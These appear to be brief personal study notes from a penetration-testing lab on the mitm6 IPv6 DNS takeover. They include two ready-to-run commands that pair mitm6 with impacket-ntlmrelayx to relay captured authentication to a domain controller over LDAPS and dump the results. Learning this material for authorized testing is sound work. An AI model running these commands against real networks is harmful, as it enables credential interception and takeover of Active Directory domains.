- We do not usually use IPv6, so there is no DNS server for IPv6.
- We can become an attacker as **DNS Server** and serve as MITM.
- Same as `SMB Relay`, **LDAP relaying**
- Tool called : **MITM 6**
# NEED TO REVIEW THIS AGAIN

![[Pasted image 20250329023348.png]]

- `impacket-ntlmrelayx -6 -t ldaps://<DC_IP> -wh fakewpad.marvel.local -l lootme`
- `sudo /opt/tools/mitm6/mitm6_env/bin/python /opt/tools/mitm6/mitm6/mitm6.py -d marvel.local`